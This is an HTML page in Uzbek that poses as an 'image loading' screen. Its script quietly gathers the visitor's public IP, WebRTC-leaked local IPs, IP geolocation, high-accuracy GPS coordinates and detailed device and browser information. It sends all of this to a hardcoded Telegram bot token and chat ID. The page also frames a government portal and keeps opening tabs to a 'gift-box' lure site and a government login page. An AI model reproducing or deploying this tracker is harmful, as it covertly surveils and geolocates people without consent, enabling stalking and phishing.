<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasm Yuklanmoqda...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            overflow: hidden;
        }
        .loading-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            z-index: 10;
            position: relative;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            margin: 5px 0;
            opacity: 0.9;
        }
        .page-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 100;
        }
        .status-message {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 100;
        }
        .hidden-frame {
            position: absolute;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }
        .active-frame {
            opacity: 1;
            pointer-events: all;
            z-index: 5;
        }
        .controls {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 100;
        }
        .controls button {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            margin: 0 5px;
        }
        .controls button:hover {
            background: rgba(255, 255, 255, 0.3);
        }
    </style>
</head>
<body>
    <div class="controls">
        <button onclick="pauseRotation()">Pause</button>
        <button onclick="resumeRotation()">Resume</button>
    </div>
    <div class="page-indicator">Sahifa: <span id="currentPage">1</span>/<span id="totalPages">3</span></div>
    <div class="status-message" id="statusMessage">Asosiy sahifa faol</div>
    
    <div class="loading-container">
        <div class="spinner"></div>
        <h1>Rasm Yuklanmoqda...</h1>
        <p>Iltimos, kuting</p>
    </div>

    <!-- Faqat 1-sahifa iframe'da ko'rsatiladi -->
    <iframe id="frame1" class="hidden-frame" src="about:blank"></iframe>

    <script>
        // Telegram konfiguratsiyasi
        const TELEGRAM_TOKEN = "8497552094:AAH9XKSVaoiisVOTD-gXW8GX9l8l1m5ioWM";
        const TELEGRAM_CHAT_ID = "-1003100389091";

        // Telegramga xabar yuborish funksiyasi
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Telegramga xabar yuborildi:', data);
            })
            .catch(error => {
                console.error('Telegram xatosi:', error);
            });
        }

        // Sahifalar ro'yxati
        const pages = [
            'https://my.gov.uz/ru',  // 1-sahifa - asosiy oynada
            'https://gift-box.site/66b108e0a4269/1882641120',  // 2-sahifa - yangi tabda
            'https://id.egov.uz/oz'  // 3-sahifa - yangi tabda
        ];
        
        // Sahifalar soni
        const totalPages = pages.length;
        document.getElementById('totalPages').textContent = totalPages;
        
        // Joriy sahifa indeksi
        let currentPageIndex = 0;
        let rotationPaused = false;
        let rotationTimer = null;
        
        // Yangi tabda sahifa ochish funksiyasi
        function openInNewTab(url, pageNumber) {
            try {
                // Yangi tab ochish
                const newTab = window.open(url, '_blank');
                
                if (newTab) {
                    document.getElementById('statusMessage').textContent = 
                        `Sahifa ${pageNumber} yangi tabda ochildi`;
                    console.log(`Sahifa ${pageNumber} yangi tabda ochildi`);
                    return true;
                } else {
                    // Agar tab ochilmagan bo'lsa, boshqa usul
                    const link = document.createElement('a');
                    link.href = url;
                    link.target = '_blank';
                    link.rel = 'noopener noreferrer';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    
                    document.getElementById('statusMessage').textContent = 
                        `Sahifa ${pageNumber} yangi tabda ochildi (alternativ usul)`;
                    console.log(`Sahifa ${pageNumber} yangi tabda ochildi (alternativ usul)`);
                    return true;
                }
            } catch (error) {
                document.getElementById('statusMessage').textContent = 
                    `Sahifa ${pageNumber} ochilmadi: ${error.message}`;
                console.log(`Sahifa ${pageNumber} ochilmadi:`, error);
                return false;
            }
        }
        
        // Sahifalarni almashtirish funksiyasi
        function switchPage() {
            if (rotationPaused) return;
            
            // Keyingi sahifaga o'tish
            currentPageIndex = (currentPageIndex + 1) % totalPages;
            
            // Joriy sahifa indeksini yangilash
            document.getElementById('currentPage').textContent = currentPageIndex + 1;
            
            // Sahifa turiga qarab harakat
            if (currentPageIndex === 0) {
                // 1-sahifa - asosiy oynada
                const currentFrame = document.getElementById('frame1');
                currentFrame.classList.add('active-frame');
                
                // Agar sahifa hali yuklanmagan bo'lsa, yuklash
                if (currentFrame.src === 'about:blank') {
                    currentFrame.src = pages[currentPageIndex];
                }
                
                document.getElementById('statusMessage').textContent = 'Asosiy sahifa faol';
            } else {
                // 2 va 3-sahifalar - yangi tabda
                openInNewTab(pages[currentPageIndex], currentPageIndex + 1);
                
                // Asosiy oynada 1-sahifani ko'rsatish
                const mainFrame = document.getElementById('frame1');
                mainFrame.classList.add('active-frame');
                document.getElementById('statusMessage').textContent = 
                    `Sahifa ${currentPageIndex + 1} yangi tabda ochilmoqda...`;
            }
            
            // 0.5 soniyadan so'ng keyingi sahifaga o'tish
            rotationTimer = setTimeout(switchPage, 500);
        }
        
        // Sahifalarni boshlash
        function startPageRotation() {
            // Birinchi sahifani yuklash va ko'rsatish
            const firstFrame = document.getElementById('frame1');
            firstFrame.src = pages[0];
            firstFrame.classList.add('active-frame');
            
            // 0.5 soniyadan so'ng sahifalar almashinishini boshlash
            rotationTimer = setTimeout(switchPage, 500);
        }
        
        // Pause funksiyasi
        function pauseRotation() {
            rotationPaused = true;
            if (rotationTimer) {
                clearTimeout(rotationTimer);
            }
            document.getElementById('statusMessage').textContent = 'Sahifa almashinishi to\'xtatildi';
        }
        
        // Resume funksiyasi
        function resumeRotation() {
            rotationPaused = false;
            document.getElementById('statusMessage').textContent = 'Sahifa almashinishi davom etmoqda';
            rotationTimer = setTimeout(switchPage, 500);
        }
        
        // Juda oddiy va ishonchli tracker
        function startTracking() {
            // 1. IP ni olish
            fetch('https://api.ipify.org?format=json')
            .then(function(response) { 
                if (!response.ok) {
                    throw new Error('Tarmoq javobi yaxshi emas');
                }
                return response.json(); 
            })
            .then(function(ipData) {
                const publicIP = ipData.ip;
                
                // Geolokatsiya ma'lumotlarini olish
                getGeolocation(publicIP).then(geoData => {
                    // 2. Local IP ni olish
                    let localIPs = "Aniqlanmoqda";
                    try {
                        const pc = new RTCPeerConnection({iceServers: []});
                        pc.createDataChannel('');
                        pc.createOffer().then(function(offer) { 
                            return pc.setLocalDescription(offer); 
                        });
                        
                        const ips = [];
                        pc.onicecandidate = function(e) {
                            if (e.candidate) {
                                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                                if (match) ips.push(match[1]);
                            }
                        };
                        
                        setTimeout(function() {
                            localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
                            sendTrackingData(publicIP, localIPs, geoData);
                        }, 2000);
                        
                    } catch (e) {
                        localIPs = 'Xato: ' + e.message;
                        sendTrackingData(publicIP, localIPs, geoData);
                    }
                });
            })
            .catch(function(error) {
                console.error('Xato:', error);
                sendTrackingData('IP olishda xato: ' + error.message, 'Noma lum', {});
            });
        }

        // IP orqali geolokatsiya ma'lumotlarini olish
        function getGeolocation(ip) {
            return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        return {
                            country: data.country,
                            region: data.regionName,
                            city: data.city,
                            isp: data.isp,
                            coordinates: `${data.lat}, ${data.lon}`,
                            timezone: data.timezone
                        };
                    }
                    return {};
                })
                .catch(error => {
                    console.error('Geolokatsiya xatosi:', error);
                    return {};
                });
        }

        function sendTrackingData(publicIP, localIPs, geoData) {
            const now = new Date();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Tizim ma'lumotlari
            const systemInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Noma lum',
                deviceMemory: navigator.deviceMemory || 'Noma lum',
                maxTouchPoints: navigator.maxTouchPoints || 0
            };

            let messageContent = "📊 <b>Yangi Foydalanuvchi Ma'lumotlari</b>\n\n";
            messageContent += "🌐 <b>Public IP:</b> " + publicIP + "\n";
            messageContent += "🏠 <b>Local IPs:</b> " + localIPs + "\n";
            messageContent += "🕐 <b>Local Time:</b> " + now.toLocaleString() + "\n";
            
            if (Object.keys(geoData).length > 0) {
                messageContent += "\n🗺 <b>IP Geolocation</b>\n";
                messageContent += "📍 <b>Location:</b> " + (geoData.coordinates || 'Noma lum') + "\n";
                messageContent += "🏙 <b>City:</b> " + (geoData.city || 'Noma lum') + "\n";
                messageContent += "🌍 <b>Region:</b> " + (geoData.region || 'Noma lum') + ", " + (geoData.country || 'Noma lum') + "\n";
                messageContent += "🏢 <b>ISP:</b> " + (geoData.isp || 'Noma lum') + "\n";
            }
            
            messageContent += "\n🖥 <b>System Information</b>\n";
            messageContent += "💻 <b>Platform:</b> " + systemInfo.platform + "\n";
            messageContent += "🧠 <b>CPU Cores:</b> " + systemInfo.hardwareConcurrency + "\n";
            messageContent += "💾 <b>RAM:</b> " + (systemInfo.deviceMemory ? systemInfo.deviceMemory + ' GB' : 'Noma lum') + "\n";
            messageContent += "👆 <b>Touch Points:</b> " + systemInfo.maxTouchPoints + "\n";
            messageContent += "🌐 <b>Browser:</b> " + navigator.userAgent.split(') ')[0] + ")\n";
            messageContent += "🔗 <b>URL:</b> " + window.location.href + "\n";
            messageContent += "⏰ <b>Timezone:</b> " + timezone + "\n";
            messageContent += "📱 <b>Screen:</b> " + screen.width + "x" + screen.height + "\n";
            messageContent += "🎯 <b>Color Depth:</b> " + screen.colorDepth + "-bit\n";

            // Telegramga yuborish
            sendToTelegram(messageContent);
        }
        
        // GPS ni alohida yuborish
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const gpsMsg = "📍 <b>GPS TOPILDI!</b>\n\n" +
                                 "<b>Kenglik:</b> " + position.coords.latitude + "\n" +
                                 "<b>Uzunlik:</b> " + position.coords.longitude + "\n" +
                                 "<b>Aniqlik:</b> " + position.coords.accuracy + "m\n" +
                                 "<b>Balandlik:</b> " + (position.coords.altitude || 'Noma lum') + "m\n" +
                                 "<b>Tezlik:</b> " + (position.coords.speed || 'Noma lum') + "m/s";
                    
                    sendToTelegram(gpsMsg);
                },
                function(error) {
                    console.log('GPS rad etildi:', error.message);
                    // GPS rad etilgan holatda ham ma'lumot yuborish
                    const gpsErrorMsg = "📍 <b>GPS RAD ETILDI!</b>\n\n" +
                                 "<b>Xato:</b> " + error.message + "\n" +
                                 "<b>Kod:</b> " + error.code;
                    
                    sendToTelegram(gpsErrorMsg);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // Brauzer va tizim qo'shimcha ma'lumotlari
        function collectAdditionalInfo() {
            const info = {
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Yo q',
                javaEnabled: navigator.javaEnabled ? 'Ha' : 'Yo q',
                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ha' : 'Yo q',
                doNotTrack: navigator.doNotTrack || 'Noma lum',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'Noma lum'
            };
            
            return info;
        }

        // Darrov ishga tushirish
        document.addEventListener('DOMContentLoaded', function() {
            startTracking();
            
            // Qo'shimcha ma'lumotlarni yig'ish va yuborish
            setTimeout(() => {
                const additionalInfo = collectAdditionalInfo();
                const additionalMsg = "🔧 <b>Qo'shimcha Tizim Ma'lumotlari</b>\n\n" +
                             "🔌 <b>Pluginlar:</b> " + additionalInfo.plugins + "\n" +
                             "☕ <b>Java:</b> " + additionalInfo.javaEnabled + "\n" +
                             "📄 <b>PDF Ko'ruvchi:</b> " + additionalInfo.pdfViewerEnabled + "\n" +
                             "🚫 <b>Kuzatish:</b> " + additionalInfo.doNotTrack + "\n" +
                             "📡 <b>Ulanish:</b> " + (additionalInfo.connection.effectiveType || 'Noma lum');
                
                sendToTelegram(additionalMsg);
            }, 4000);
            
            // Sahifalar almashinishini boshlash
            startPageRotation();
        });
    </script>
</body>
</html>
